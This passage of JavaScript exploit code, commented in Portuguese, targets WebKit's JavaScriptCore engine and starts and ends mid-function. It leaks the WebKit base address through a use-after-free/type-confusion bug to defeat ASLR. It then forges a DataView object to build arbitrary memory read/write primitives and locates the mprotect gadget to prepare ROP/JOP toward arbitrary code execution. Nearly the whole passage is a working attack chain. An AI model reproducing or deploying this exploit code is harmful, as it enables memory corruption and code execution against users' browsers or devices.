                const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
                webkit_base_address = untagged_uaf_addr.sub(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64);

                // Verificação da validade da base WebKit
                // Uma base válida deve ter os 12 bits menos significativos (os 3 últimos dígitos hex) como zero,
                // ou seja, ser alinhada a 0x1000. Também não pode ser zero.
                if (webkit_base_address.equals(AdvancedInt64.Zero) || (webkit_base_address.low() & 0xFFF) !== 0x000) {
                    logFn(`[UAF LEAK] Base WebKit calculada é inválida ou não alinhada: ${webkit_base_address.toString(true)}. Tentativa ${attempt} falhou.`, "critical");
                    if (attempt === UAF_ATTEMPTS) throw new Error("Vazamento de ASLR via UAF/TC falhou após N tentativas.");
                    uaf_leak_success = false; // Reset para a próxima tentativa
                    continue; // Tentar a próxima iteração
                }
                logFn(`SUCESSO: Endereço base REAL da WebKit OBTIDO VIA UAF/TC: ${webkit_base_address.toString(true)}`, "good");

                // Fazer um pequeno dump para confirmar que a base WebKit está correta (lendo um gadget conhecido)
                const mprotect_plt_offset_check = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
                const mprotect_addr_check = webkit_base_address.add(mprotect_plt_offset_check);
                logFn(`[UAF LEAK] Verificando gadget mprotect_plt_stub em ${mprotect_addr_check.toString(true)} (para validar ASLR).`, "info");
                // Usando a primitiva arb_read LOCAL (do core_exploit.mjs), que deve funcionar
                const mprotect_first_bytes_check = await arb_read(mprotect_addr_check, 4);

                if (mprotect_first_bytes_check !== 0 && mprotect_first_bytes_check !== 0xFFFFFFFF) { // Uma verificação mais robusta
                    logFn(`[UAF LEAK] LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes_check)}. ASLR validado!`, "good");
                    break; // Sai do loop de tentativas, pois o vazamento foi bem-sucedido
                } else {
                     logFn(`[UAF LEAK] ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF. ASLR pode estar incorreto ou arb_read local falhando para endereços de código. Tentativa ${attempt} falhou.`, "warn");
                     if (attempt === UAF_ATTEMPTS) throw new Error("Falha na validação do gadget mprotect após N tentativas.");
                     uaf_leak_success = false; // Reset para a próxima tentativa
                     continue; // Tentar a próxima iteração
                }
            } else { // if (!uaf_leak_success) dentro do loop de tentativas
                logFn(`[UAF LEAK] Ponteiro vazado do UAF é inválido (double) ou não taggeado. Valor: ${leaked_jsvalue_from_uaf_double}. Provável falha de reocupação do heap. Tentativa ${attempt} falhou.`, "error");
                if (attempt === UAF_ATTEMPTS) {
                    throw new Error("Vazamento de ASLR via UAF/TC falhou após N tentativas. Abortando exploração.");
                }
            }
        } // Fim do loop de tentativas UAF

        if (!uaf_leak_success) {
            throw new Error("Vazamento de ASLR via UAF/TC falhou após todas as tentativas. Abortando exploração.");
        }
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        // --- FASE 3: Configurando a NOVA primitiva de L/E Arbitrária Universal (via fakeobj DataView) com Tentativa e Erro de m_mode ---
        // Este bloco só será executado se o vazamento de ASLR UAF/TC for bem-sucedido.
        logFn("--- FASE 3: Configurando a NOVA primitiva de L/E Arbitrária Universal (via fakeobj DataView) com Tentativa e Erro de m_mode ---", "subtest");

        const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FOR_FAKE = parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16);
        const DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = webkit_base_address.add(new AdvancedInt64(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FOR_FAKE, 0));
        logFn(`[${FNAME_CURRENT_TEST_BASE}] Endereço calculado do vtable da DataView Structure para FORJAMENTO: ${DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE.toString(true)}`, "info");

        const mModeCandidates = JSC_OFFSETS_PARAM.DataView.M_MODE_CANDIDATES;
        let universalRwSuccess = false;

        for (const candidate_m_mode of mModeCandidates) {
            logFn(`[${FNAME_CURRENT_TEST_BASE}] Tentando m_mode candidato: ${toHex(candidate_m_mode)}`, "info");
            universalRwSuccess = await attemptUniversalArbitraryReadWriteWithMMode(
                logFn,
                pauseFn,
                JSC_OFFSETS_PARAM,
                DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE,
                candidate_m_mode
            );
            if (universalRwSuccess) {
                found_m_mode = candidate_m_mode;
                logFn(`[${FNAME_CURRENT_TEST_BASE}] SUCESSO: Primitive Universal ARB R/W configurada com m_mode: ${toHex(found_m_mode)}.`, "good");
                break;
            } else {
                logFn(`[${FNAME_CURRENT_TEST_BASE}] FALHA: m_mode ${toHex(candidate_m_mode)} não funcionou. Tentando o próximo...`, "warn");
                await pauseFn(LOCAL_SHORT_PAUSE); // Pausa menor entre as tentativas de m_mode
            }
        }

        if (!universalRwSuccess) {
            const errorMsg = "Falha crítica: NENHUM dos m_mode candidatos conseguiu configurar a primitiva Universal ARB R/W via fakeobj DataView. Abortando exploração.";
            logFn(errorMsg, "critical");
            throw new Error(errorMsg);
        }
        logFn("Primitiva de L/E Arbitrária Universal (arb_read_universal_js_heap / arb_write_universal_js_heap) CONFIGURADA com sucesso.", "good");
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        // Teste de leitura/escrita com a primitiva universal recém-adquirida
        const dumpTargetUint8Array = new Uint8Array(0x100); // Um objeto JS real para testar a primitiva
        hold_objects.push(dumpTargetUint8Array); // Mantê-lo vivo
        const dumpTargetAddr = addrof_core(dumpTargetUint8Array);
        logFn(`[DEBUG] Dump de memória de um novo Uint8Array real (${dumpTargetAddr.toString(true)}) usando L/E Universal.`, "debug");
        await dumpMemory(dumpTargetAddr, 0x100, logFn, arb_read_universal_js_heap, "Uint8Array Real Dump (Post-Universal-RW)");
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        logFn("Iniciando descoberta FUNCIONAL de gadgets ROP/JOP na WebKit...", "info");
        const mprotect_plt_offset = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
        const mprotect_addr_real = webkit_base_address.add(mprotect_plt_offset);

        logFn(`[REAL LEAK] Endereço do gadget 'mprotect_plt_stub' calculado: ${mprotect_addr_real.toString(true)}`, "leak");
        // Usar a primitiva universal para ler o gadget
        const mprotect_first_bytes = await arb_read_universal_js_heap(mprotect_addr_real, 4, logFn);
        logFn(`[REAL LEAK] Primeiros 4 bytes de mprotect_plt_stub (${mprotect_addr_real.toString(true)}): ${toHex(mprotect_first_bytes)}`, "leak");
        if (mprotect_first_bytes !== 0 && mprotect_first_bytes !== 0xFFFFFFFF) {
            logFn(`[REAL LEAK] Leitura do gadget mprotect_plt_stub via L/E Universal bem-sucedida.`, "good");
        } else {
             logFn(`[REAL LEAK] FALHA: Leitura do gadget mprotect_plt_stub via L/E Universal retornou zero ou FFFFFFFF.`, "error");
        }

        logFn(`PREPARED: Tools for ROP/JOP (real addresses) are ready. Time: ${(performance.now() - startTime).toFixed(2)}ms`, "good");
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        logFn("--- FASE 5: Verificação Funcional de L/E e Teste de Resistência ao GC (Pós-ASLR Leak) ---", "subtest");
        const rwTestPostLeakStartTime = performance.now();

        // Escolher um objeto do spray inicial para teste de L/E com as novas primitivas.
        // É importante que seja um objeto válido no heap JS.
        const test_obj_post_leak = global_spray_objects.length > 0 ?
                                   global_spray_objects[Math.floor(global_spray_objects.length / 2)] : // Pega um objeto do meio do spray inicial
                                   { test_val_prop: 0x98765432, another_prop: 0xABCDEF00 }; // Se o spray inicial foi limpo, cria um novo objeto
        hold_objects.push(test_obj_post_leak);
        logFn(`Objeto de teste escolhido do spray (ou novo criado) para teste pós-vazamento.`, "info");

        const test_obj_addr_post_leak = addrof_core(test_obj_post_leak);
        logFn(`Endereço do objeto de teste pós-vazamento: ${test_obj_addr_post_leak.toString(true)}`, "info");

        // Usar fakeobj_core para obter uma referência "controlada" para o objeto de teste.
        const faked_obj_for_post_leak_test = fakeobj_core(test_obj_addr_post_leak);
        if (!faked_obj_for_post_leak_test || typeof faked_obj_for_post_leak_test !== 'object') {
            throw new Error("Failed to recreate fakeobj for post-ASLR leak test.");
        }

        const original_val_prop = test_obj_post_leak.val1 || test_obj_post_leak.test_val_prop;
        logFn(`Valor original de 'val1'/'test_val_prop' no objeto de teste: ${toHex(original_val_prop)}`, 'debug');

        // Modificar uma propriedade do objeto através da referência forjada
        faked_obj_for_post_leak_test.val1 = 0x1337BEEF; // Ou faked_obj_for_post_leak_test.test_val_prop
        await pauseFn(LOCAL_VERY_SHORT_PAUSE); // Pausa muito curta
        // Ler de volta para verificar
        const read_back_val_prop = faked_obj_for_post_leak_test.val1; // Ou faked_obj_for_post_leak_test.test_val_prop

        if (test_obj_post_leak.val1 === 0x1337BEEF && read_back_val_prop === 0x1337BEEF) {
            logFn(`SUCESSO: Escrita/Leitura de propriedade via fakeobj (após vazamento ASLR) validada. Objeto original 'val1' agora é 0x1337BEEF.`, "good");
        } else {
            logFn(`FALHA: Escrita/Leitura de propriedade via fakeobj (após vazamento ASLR) inconsistente. Original 'val1': ${toHex(test_obj_post_leak.val1)}, Read via fakeobj: ${toHex(read_back_val_prop)}.`, "error");
            throw new Error("R/W verification post-ASLR leak failed.");
        }

        logFn("SUCESSO: Verificação de L/E pós-vazamento validada.", "good");

        logFn("Iniciando teste de resistência PÓS-VAZAMENTO: Executando L/E arbitrária universal múltiplas vezes...", "info");
        let resistanceSuccessCount_post_leak = 0;
        const numResistanceTests = 10;
        // Obter o endereço do "Butterfly" do objeto, que armazena as propriedades
        const butterfly_addr_of_spray_obj = test_obj_addr_post_leak.add(JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET);

        for (let i = 0; i < numResistanceTests; i++) {
            const test_value_arb_rw = new AdvancedInt64(0xCCCC0000 + i, 0xDDDD0000 + i);
            try {
                await arb_write_universal_js_heap(butterfly_addr_of_spray_obj, test_value_arb_rw, 8, logFn);
                const read_back_value_arb_rw = await arb_read_universal_js_heap(butterfly_addr_of_spray_obj, 8, logFn);

                if (read_back_value_arb_rw.equals(test_value_arb_rw)) {
                    resistanceSuccessCount_post_leak++;
                    logFn(`[Resistência PÓS-VAZAMENTO #${i}] SUCESSO: L/E arbitrária consistente no Butterfly.`, "debug");
                } else {
                    logFn(`[Resistência PÓS-VAZAMENTO #${i}] FALHA: L/E arbitrária inconsistente no Butterfly. Written: ${test_value_arb_rw.toString(true)}, Read: ${read_back_value_arb_rw.toString(true)}.`, "error");
                }
            } catch (resErr) {
                logFn(`[Resistência PÓS-VAZAMENTO #${i}] ERRO: Exceção durante L/E arbitrária no Butterfly: ${resErr.message}`, "error");
            }
            await pauseFn(LOCAL_VERY_SHORT_PAUSE);
        }
        if (resistanceSuccessCount_post_leak === numResistanceTests) {
            logFn(`SUCESSO TOTAL: Teste de resistência PÓS-VAZAMENTO concluído. ${resistanceSuccessCount_post_leak}/${numResistanceTests} operações bem-sucedidas.`, "good");
        } else {
            logFn(`ALERTA: Teste de resistência PÓS-VAZAMENTO concluído com ${numResistanceTests - resistanceSuccessCount_post_leak} falhas.`, "warn");
            final_result.message += ` (Teste de resistência L/E pós-vazamento com falhas: ${numResistanceTests - resistanceSuccessCount_post_leak})`;
        }
        logFn(`Verificação funcional de L/E e Teste de Resistência PÓS-VAZAMENTO concluídos. Time: ${(performance.now() - rwTestPostLeakStartTime).toFixed(2)}ms`, "info");


        logFn("++++++++++++ SUCESSO TOTAL! Todas as fases do exploit foram concluídas com sucesso. ++++", "vuln");
        final_result = {
            success: true,
            message: "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada. Vazamento REAL de Base WebKit e preparação para ACE bem-sucedidos.",
            details: {
                webkitBaseAddress: webkit_base_address ? webkit_base_address.toString(true) : "N/A",
                mprotectGadget: mprotect_addr_real ? mprotect_addr_real.toString(true) : "N/A",
                foundMMode: found_m_mode ? toHex(found_m_mode) : "N/A"
            }
        };

    } catch (e) {
        final_result.message = `Exceção crítica na implementação funcional: ${e.message}\n${e.stack || ''}`;
        final_result.success = false;
        logFn(final_result.message, "critical");
    } finally {
        logFn(`Iniciando limpeza final do ambiente e do spray de objetos...`, "info");
        // Limpar objetos mantidos em hold_objects e global_spray_objects
        // Isso garante que a memória seja liberada e o ambiente volte a um estado limpo
        global_spray_objects = [];
        hold_objects = [];

        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        logFn(`Limpeza final concluída. Time total do teste: ${(performance.now() - startTime).toFixed(2)}ms`, "info");
    }

    logFn(`--- ${FNAME_CURRENT_TEST_BASE} Concluído. Resultado final: ${final_result.success ? 'SUCESSO' : 'FALHA'} ---`, "test");
    logFn(`Mensagem final: ${final_result.message}`, final_result.success ? 'good' : 'critical');
    if (final_result.details) {
        logFn(`Detalhes adicionais do teste: ${JSON.stringify(final_result.details)}`, "info");
    }

    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: { success: final_result.success, msg: final_result.message, details: final_result.details },
        heisenbug_on_M2_in_best_result: 'N/A (UAF Strategy)',
        oob_value_of_best_result: 'N/A (UAF Strategy)',
        tc_probe_details: { strategy: 'UAF/TC -> ARB R/W' }
    };
}
